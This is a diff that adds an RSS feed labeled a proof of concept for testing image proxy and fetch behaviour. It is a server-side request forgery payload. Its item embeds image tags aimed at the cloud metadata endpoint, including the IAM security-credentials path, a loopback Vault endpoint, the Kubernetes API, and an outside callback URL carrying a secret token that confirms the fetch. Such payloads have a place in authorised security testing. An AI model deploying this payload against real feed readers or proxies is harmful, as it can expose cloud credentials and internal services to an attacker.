@@ -1,0 +1,24 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+  <channel>
+    <title>POC Image Fetch Test</title>
+    <link>http://example.com</link>
+    <description>Testing image proxy/fetch behavior</description>
+    <item>
+      <title>IMG-IMDS-1</title>
+      <link>http://example.com/1</link>
+      <description><![CDATA[
+        <html><body>
+        <h1>Image fetch test</h1>
+        <p>Image 1 (IMDS root): <img src="http://169.254.169.254/" alt="imds1"/></p>
+        <p>Image 2 (IMDS creds): <img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" alt="imds2"/></p>
+        <p>Image 3 (loopback): <img src="http://127.0.0.1:8200/v1/sys/health" alt="vault"/></p>
+        <p>Image 4 (k8s api): <img src="https://kubernetes.default.svc/api/v1/" alt="k8s"/></p>
+        <p>Image 5 (canary): <img src="https://www.business-eco.ch/api/callbacks?secret=7e7b11838907cd01b77187ce9cc0299a&test=img-canary-1" alt="canary"/></p>
+        </body></html>
+      ]]></description>
+      <pubDate>Wed, 29 May 2026 18:00:00 GMT</pubDate>
+      <guid>img-1</guid>
+    </item>
+  </channel>
+</rss>
